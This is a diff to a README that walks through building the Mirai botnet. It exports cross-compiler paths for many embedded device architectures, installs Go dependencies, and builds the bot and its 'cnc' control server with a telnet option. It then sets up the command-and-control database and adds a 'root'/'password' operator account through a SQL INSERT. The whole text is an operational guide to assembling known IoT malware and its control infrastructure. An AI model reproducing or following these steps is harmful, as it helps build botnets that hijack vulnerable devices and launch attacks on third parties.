@@ -16,14 +16,33 @@ See script for detail.
 cd scripts
 ./xcompile.sh
 ```
-## Step 3: Install go packages:
+
+## Step 3: export path
+```
+export PATH=$PATH:/etc/xcompile/armv4l/bin
+export PATH=$PATH:/etc/xcompile/armv6l/bin
+export PATH=$PATH:/etc/xcompile/i586/bin
+export PATH=$PATH:/etc/xcompile/m68k/bin
+export PATH=$PATH:/etc/xcompile/mips/bin
+export PATH=$PATH:/etc/xcompile/mipsel/bin
+export PATH=$PATH:/etc/xcompile/powerpc/bin
+export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
+export PATH=$PATH:/etc/xcompile/sh4/bin
+export PATH=$PATH:/etc/xcompile/sparc/bin
+export PATH=$PATH:/etc/xcompile/armv6l/bin
+ 
+export PATH=$PATH:/usr/local/go/bin
+export GOPATH=$HOME/Documents/go
+```
+
+## Step 3: Install packages:
 ```	
 go get github.com/go-sql-driver/mysql
 go get github.com/mattn/go-shellwords
 ```
 
 ## Step 4: building mirai
-Naviage to the mirai folder where the script located  
+Naviage to the mirai folder and do the following command  
 the output files will be in the debug folder, with cnc and mirai.dbg
 ```	
 ./build.sh debug telnet
@@ -40,8 +59,11 @@ cd scripts
 mysql -u root -p
 -enter password-
 source db.sql;
+use mirai;
+INSERT INTO users VALUES (NULL, 'root', 'password', 0, 0, 0, 0, -1, 1, 30, '');
 quit;
 ```
+
 
 ## Step 6: Database continuing
 edit main.go file located in ../mirai/cnc  
